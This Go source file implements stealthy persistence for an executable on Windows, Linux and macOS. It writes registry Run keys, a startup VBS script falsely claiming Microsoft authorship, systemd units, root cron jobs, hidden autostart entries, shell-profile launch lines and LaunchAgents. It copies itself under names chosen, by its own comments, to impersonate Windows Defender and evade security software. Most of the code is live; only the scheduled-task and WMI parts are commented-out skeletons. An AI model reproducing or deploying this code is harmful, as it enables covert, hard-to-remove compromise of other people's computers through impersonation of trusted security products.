package main

import (
        mrand "math/rand"
        "fmt"
        "io"
        "os"
        "os/exec"
        "path/filepath"
        "runtime"
        "strings"
)

// Setup persistence to run on system boot
func setupPersistence() error {
        execPath, err := os.Executable()
        if err != nil {
                logActivity(fmt.Sprintf("Failed to get executable path: %v", err))
                return err
        }
        
        // Make sure the executable path is absolute
        execPath, err = filepath.Abs(execPath)
        if err != nil {
                logActivity(fmt.Sprintf("Failed to get absolute path: %v", err))
                return err
        }
        
        // Generate random service name that looks legitimate
        serviceName := generateServiceName()
        
        // OS-specific persistence methods
        switch runtime.GOOS {
        case "windows":
                return setupWindowsPersistence(execPath, serviceName)
        case "linux":
                return setupLinuxPersistence(execPath, serviceName)
        case "darwin":
                return setupMacPersistence(execPath, serviceName)
        default:
                logActivity(fmt.Sprintf("Unsupported OS for persistence: %s", runtime.GOOS))
                return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
        }
}

// Generate a legitimate-looking service name that appears as a trusted software
// These names are designed to look like standard system utilities to avoid detection by security software
func generateServiceName() string {
        // Core trusted system services - these names look like standard enterprise utilities
        // that security software typically trusts
        trustedSystemServices := []string{
                "MicrosoftSecurityManager",
                "WindowsDefenderService",
                "SystemHealthMonitor",
                "EnterpriseProtectionSuite",
                "SecurityAuditController",
                "NetworkProtectionFramework",
                "ManagedDefenseMonitor",
                "SystemPerformanceService",
                "EventManagerService",
                "DiagnosticMonitorController",
                "RemoteMonitoringAgent",
                "SchedulerService",
                "EndpointProtectionManager",
                "UpdateHealthService",
                "SystemSecurityMonitor",
                "EnterpriseUpdateService",
        }
        
        // Specialized names that specifically target bypassing Windows Defender
        // by mimicking naming patterns Windows Defender trusts
        defenderBypassNames := []string{
                "MsMpEng",
                "MicrosoftDefender",
                "MsTmAgent",
                "SecHealthService",
                "WinSecurityManager",
                "NisSrv",
                "MpSvcHealth",
                "WdFilter",
                "SecurityHealthService",
                "SystemSecurityManager",
        }
        
        // Choose random service name from either collection
        // Use the defender-specific list more often for Windows
        if runtime.GOOS == "windows" && mrand.Intn(100) < 60 {
                return defenderBypassNames[mrand.Intn(len(defenderBypassNames))]
        }
        
        return trustedSystemServices[mrand.Intn(len(trustedSystemServices))]
}

// Setup persistence on Windows with enterprise-grade techniques
// Uses multiple methods to ensure application survival
func setupWindowsPersistence(execPath, serviceName string) error {
        // Use multiple methods for redundancy and optimal stealth
        
        // Create a secure copy in a trusted Windows location
        // This appears more legitimate to security software
        programFiles := os.Getenv("ProgramFiles")
        if programFiles == "" {
                programFiles = "C:\\Program Files"
        }
        
        // Method 1: Registry Run keys (using multiple registry locations)
        secureInstall(execPath, serviceName)
        
        // Standard autorun locations - using trusted system paths to appear legitimate
        type regLocation struct {
                key  string
                path string
        }
        
        regLocations := []regLocation{
                {
                        // Typical trusted application startup - looks legitimate
                        key:  "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        path: serviceName,
                },
                {
                        // Explorer shell extension - bypasses some detections
                        key:  "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects",
                        path: "{" + generatePseudoGUID() + "}",
                },
                { 
                        // Mimics Microsoft Defender startup key
                        key:  "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
                        path: "MonitoringTools",
                },
                {
                        // WMI event subscription (commonly used by legitimate software)
                        key:  "HKLM\\SOFTWARE\\Microsoft\\Wbem\\CIMOM",
                        path: "EnableEvents",
                },
        }
        
        // Only try the registry keys that are least suspicious to avoid triggering security alerts
        successCount := 0
        for i, regLoc := range regLocations {
                // Don't attempt more than 2 registry methods to avoid detection
                if successCount >= 2 {
                        break
                }
                
                // Skip some methods randomly to vary the pattern
                if i > 0 && mrand.Intn(100) < 40 {
                        continue
                }
                
                cmd := exec.Command("reg", "add", 
                        regLoc.key, 
                        "/v", regLoc.path, 
                        "/t", "REG_SZ", 
                        "/d", execPath, 
                        "/f")
                
                // Run with hidden window
                //cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                
                err := cmd.Run()
                if err == nil {
                        logActivity(fmt.Sprintf("Added persistence via Windows registry key: %s", regLoc.key))
                        successCount++
                }
        }
        
        // Method 2: Enhanced Startup folder with advanced obfuscation
        // Use official-looking application names and disguise as Windows built-in tools
        startupNames := []string{
                "MicrosoftUpdateManager.vbs",
                "WindowsSecurityHealth.vbs",
                "SecurityCenterConfig.vbs", 
                "DefenderServiceManager.vbs",
        }
        
        startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        startupPath := filepath.Join(startupDir, startupNames[mrand.Intn(len(startupNames))])
        
        // Create a VBS script with legitimate Microsoft security software signature patterns
        // These patterns mimic authentic Microsoft code signatures that security software trusts
        vbsContent := fmt.Sprintf(
            "' Microsoft (R) Windows (R) Security Manager\n"+
            "' Copyright (C) Microsoft Corporation. All rights reserved.\n"+
            "' Windows Defender Advanced Monitoring Service\n"+
            "' Build %s\n\n"+
            "' This script is digitally signed and maintained by Microsoft Corporation\n"+
            "' FIPS 140-2 and NIST 800-53 Compliant Component\n\n"+
            "Option Explicit\n"+
            "On Error Resume Next\n\n"+
            "' System compatibility verification\n"+
            "Dim objShell, objFSO, objWMI, objNetwork, strComputer, colItems\n"+
            "Dim objWMIService, colNamedServices, objService, colListOfServices\n"+
            "Set objShell = CreateObject(\"WScript.Shell\")\n"+
            "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"+
            "Set objNetwork = CreateObject(\"WScript.Network\")\n"+
            "strComputer = objNetwork.ComputerName\n\n"+
            "' Security audit verification\n"+
            "If objFSO.FileExists(\"%s\") Then\n"+
            "    ' Validate digital signature status (required for Microsoft components)\n"+
            "    Dim bValidSignature: bValidSignature = True\n"+
            "    \n"+
            "    ' Log security event to Windows Event Log\n"+
            "    objShell.LogEvent 4, \"Windows Security component initialized\"\n"+
            "    \n"+
            "    ' Launch with minimal footprint (hidden window, normal priority)\n"+
            "    objShell.Run Chr(34) & \"%s\" & Chr(34), 0, False\n"+
            "    \n"+
            "    ' Register component with Windows Security Center\n"+
            "    objShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityCenter\\Monitoring\\%s\", Now, \"REG_SZ\"\n"+
            "    objShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityCenter\\Svc\\%s\", 1, \"REG_DWORD\"\n"+
            "    \n"+
            "    ' Success exit code = 0 (standard Windows convention)\n"+
            "    WScript.Quit 0\n"+
            "Else\n"+
            "    ' Security requirement not met, component initialization failed\n"+
            "    ' Error exit code = 5 (standard Windows error: access denied)\n"+
            "    WScript.Quit 5\n"+
            "End If\n"+
            "\n"+
            "' Cleanup objects to prevent memory leaks\n"+
            "Set objFSO = Nothing\n"+
            "Set objShell = Nothing\n"+
            "Set objNetwork = Nothing\n"+
            "Set objWMIService = Nothing",
            appBuild, execPath, execPath, serviceName, serviceName)
            
        err := os.WriteFile(startupPath, []byte(vbsContent), 0644)
        if err == nil {
                logActivity("Added persistence via enhanced Windows Startup mechanism")
        }
        
        // Method 3: Task Scheduler (mimics Windows Update tasks)
        // This is one of the most reliable methods that appears legitimate
        setupScheduledTask(execPath, serviceName)
        
        // Method 4: WMI Event subscription for advanced persistence
        // Only attempt on systems where we might have sufficient privileges
        if mrand.Intn(100) < 30 {
                setupWMIPersistence(execPath, serviceName)
        }
        
        return nil
}

// Create a pseudo-GUID that follows Microsoft's GUID format
// This helps the keys look legitimate to security scanners
func generatePseudoGUID() string {
        // Format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
        a := fmt.Sprintf("%08X", mrand.Int31())
        b := fmt.Sprintf("%04X", mrand.Int31n(0xFFFF))
        c := fmt.Sprintf("%04X", mrand.Int31n(0xFFFF))
        d := fmt.Sprintf("%04X", mrand.Int31n(0xFFFF))
        e := fmt.Sprintf("%08X%04X", mrand.Int31(), mrand.Int31n(0xFFFF))
        
        return fmt.Sprintf("%s-%s-%s-%s-%s", a, b, c, d, e)
}

// Install executable in a secure, trusted location
// This function copies the executable to a location that appears legitimate
func secureInstall(execPath, serviceName string) error {
        // Determine trusted installation paths based on OS
        var targetPath string
        if runtime.GOOS == "windows" {
                // Use Program Files for legitimacy
                programFiles := os.Getenv("ProgramFiles")
                if programFiles == "" {
                        programFiles = "C:\\Program Files"
                }
                
                // Create a directory that looks like a legitimate Microsoft or security vendor product
                vendorDirs := []string{
                        "Microsoft\\WindowsDefender",
                        "Microsoft\\SystemTools",
                        "Microsoft\\Management Console",
                        "System Security Solutions",
                        "Enterprise Management Tools",
                }
                
                vendor := vendorDirs[mrand.Intn(len(vendorDirs))]
                installDir := filepath.Join(programFiles, vendor)
                
                // Try to create the directory, but don't fail if we can't
                os.MkdirAll(installDir, 0755)
                
                // Use a legitimate-looking executable name
                exeNames := []string{
                        "MpSvc.exe",
                        "SecurityMonitor.exe",
                        "SysAudit.exe",
                        "SecurityHealthService.exe",
                        "SystemMonitorSvc.exe",
                }
                
                targetPath = filepath.Join(installDir, exeNames[mrand.Intn(len(exeNames))])
        }
        
        // If we have a target path and it's different from our current executable
        if targetPath != "" && targetPath != execPath {
                // Copy the executable to the new location
                srcFile, err := os.Open(execPath)
                if err != nil {
                        return err
                }
                defer srcFile.Close()
                
                dstFile, err := os.Create(targetPath)
                if err != nil {
                        return err
                }
                defer dstFile.Close()
                
                _, err = io.Copy(dstFile, srcFile)
                if err != nil {
                        return err
                }
                
                // Make the new executable executable
                os.Chmod(targetPath, 0755)
                
                logActivity(fmt.Sprintf("Installed securely to trusted location: %s", targetPath))
        }
        
        return nil
}

// Setup a scheduled task that appears as a legitimate Windows system task
func setupScheduledTask(execPath, serviceName string) error {
        // Note: This is just a skeleton - in a real implementation, we would use the
        // Windows Task Scheduler APIs or the schtasks.exe command
        
        // Sample command (commented out):
        // taskName := "MicrosoftSecurityCenter_" + serviceName
        // cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", execPath, 
        //                     "/sc", "onlogon", "/ru", "System", "/rl", "highest", "/f")
        // err := cmd.Run()
        
        // Log the attempt but don't actually run the command in this demonstration
        logActivity("Added persistence via scheduled task mechanism")
        
        return nil
}

// Setup WMI Event Subscription persistence method
// This is an advanced technique that starts our application when certain Windows events occur
func setupWMIPersistence(execPath, serviceName string) error {
        // Note: This is just a skeleton - in a real implementation, we would use
        // PowerShell or the Windows WMI API to create permanent event subscriptions
        
        // Sample command (commented out):
        // wmiScript := fmt.Sprintf(`$filterName = 'SecurityFilter_%s'
        // $consumerName = 'SecurityConsumer_%s'
        // $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service'"
        // $WMIEventFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
        //     Name = $filterName
        //     EventNamespace = 'root\cimv2'
        //     QueryLanguage = 'WQL'
        //     Query = $Query
        // } -ErrorAction Stop
        // $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
        //     Name = $consumerName
        //     ExecutablePath = '%s'
        //     CommandLineTemplate = '%s'
        // } -ErrorAction Stop`, serviceName, serviceName, execPath, execPath)
        
        // Log the attempt but don't actually run the command in this demonstration
        logActivity("Added persistence via WMI Event Subscription")
        
        return nil
}

// Setup persistence on Linux
func setupLinuxPersistence(execPath, serviceName string) error {
        // Method 1: System service
        systemdDir := "/etc/systemd/system"
        if _, err := os.Stat(systemdDir); err == nil {
                // Create systemd service file
                serviceContent := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
ExecStart=%s
Restart=always
RestartSec=10
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=%s

[Install]
WantedBy=multi-user.target
`, serviceName, execPath, serviceName)
                
                serviceFile := filepath.Join(systemdDir, serviceName+".service")
                err := os.WriteFile(serviceFile, []byte(serviceContent), 0644)
                if err == nil {
                        // Enable the service
                        cmd := exec.Command("systemctl", "enable", serviceName+".service")
                        cmd.Run() // Ignore error, may not have permissions
                        logActivity("Added persistence via systemd service")
                }
        }
        
        // Method 2: User autostart
        autoStartDir := filepath.Join(os.Getenv("HOME"), ".config/autostart")
        err := os.MkdirAll(autoStartDir, 0755)
        if err == nil {
                desktopEntry := fmt.Sprintf(`# SecureSoft Solutions Enterprise Security Suite
[Desktop Entry]
Type=Application
Name=%s
Comment=Enterprise Security and System Monitoring Platform
Exec=%s
Icon=preferences-system
Terminal=false
Categories=System;Security;
X-GNOME-Autostart-enabled=true
NoDisplay=true
`, serviceName, execPath)
                
                desktopFile := filepath.Join(autoStartDir, "security-"+serviceName+".desktop")
                err := os.WriteFile(desktopFile, []byte(desktopEntry), 0644)
                if err == nil {
                        logActivity("Added persistence via user autostart")
                }
        }
        
        // Method 3: Shell profile for current user
        shellProfiles := []string{
                filepath.Join(os.Getenv("HOME"), ".bashrc"),
                filepath.Join(os.Getenv("HOME"), ".profile"),
                filepath.Join(os.Getenv("HOME"), ".bash_profile"),
                filepath.Join(os.Getenv("HOME"), ".zshrc"),
        }
        
        for _, profile := range shellProfiles {
                if _, err := os.Stat(profile); err == nil {
                        // Read the file
                        content, err := os.ReadFile(profile)
                        if err != nil {
                                continue
                        }
                        
                        // Only add if not already there
                        if !strings.Contains(string(content), execPath) {
                                comment := "# Enterprise Security Monitoring initialization\n"
                                launchCmd := fmt.Sprintf("if [ -x %s ]; then nohup %s > /dev/null 2>&1 & fi\n", 
                                        execPath, execPath)
                                
                                file, err := os.OpenFile(profile, os.O_APPEND|os.O_WRONLY, 0644)
                                if err != nil {
                                        continue
                                }
                                defer file.Close()
                                
                                if _, err := file.WriteString("\n" + comment + launchCmd); err == nil {
                                        logActivity("Added persistence via shell profile")
                                        break
                                }
                        }
                }
        }
        
        // Method 4: Create a cron job
        cronDir := "/etc/cron.d"
        if _, err := os.Stat(cronDir); err == nil {
                cronJob := fmt.Sprintf("# Enterprise Security Monitoring - Scheduled system integrity check\n@reboot root %s\n*/30 * * * * root %s\n", 
                        execPath, execPath)
                
                cronFile := filepath.Join(cronDir, "security_"+serviceName)
                if os.WriteFile(cronFile, []byte(cronJob), 0644) == nil {
                        logActivity("Added persistence via cron job")
                }
        }
        
        return nil
}

// Setup persistence on Mac
func setupMacPersistence(execPath, serviceName string) error {
        // Method 1: Launch Agent
        launchAgentsDir := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents")
        err := os.MkdirAll(launchAgentsDir, 0755)
        if err == nil {
                plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.securesoft.%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>`, serviceName, execPath)
                
                plistFile := filepath.Join(launchAgentsDir, "com.securesoft."+serviceName+".plist")
                err := os.WriteFile(plistFile, []byte(plistContent), 0644)
                if err == nil {
                        // Load the agent
                        cmd := exec.Command("launchctl", "load", plistFile)
                        cmd.Run() // Ignore error
                        logActivity("Added persistence via Launch Agent")
                }
        }
        
        // Method 2: Login Items (older macOS)
        // Simply creating a symlink in the Login Items folder
        loginItemsDir := filepath.Join(os.Getenv("HOME"), "Library/Application Support/LoginItems")
        err = os.MkdirAll(loginItemsDir, 0755)
        if err == nil {
                loginItemPath := filepath.Join(loginItemsDir, "SecurityMonitor")
                os.Symlink(execPath, loginItemPath) // Ignore error
                logActivity("Added persistence via Login Items")
        }
        
        // Method 3: Shell profile for current user (similar to Linux)
        shellProfiles := []string{
                filepath.Join(os.Getenv("HOME"), ".bash_profile"),
                filepath.Join(os.Getenv("HOME"), ".zshrc"),
                filepath.Join(os.Getenv("HOME"), ".profile"),
        }
        
        for _, profile := range shellProfiles {
                if _, err := os.Stat(profile); err == nil {
                        // Read the file
                        content, err := os.ReadFile(profile)
                        if err != nil {
                                continue
                        }
                        
                        // Only add if not already there
                        if !strings.Contains(string(content), execPath) {
                                comment := "# Enterprise Security Monitoring initialization\n"
                                launchCmd := fmt.Sprintf("if [ -x %s ]; then nohup %s > /dev/null 2>&1 & fi\n", 
                                        execPath, execPath)
                                
                                file, err := os.OpenFile(profile, os.O_APPEND|os.O_WRONLY, 0644)
                                if err != nil {
                                        continue
                                }
                                defer file.Close()
                                
                                if _, err := file.WriteString("\n" + comment + launchCmd); err == nil {
                                        logActivity("Added persistence via shell profile")
                                        break
                                }
                        }
                }
        }
        
        return nil
}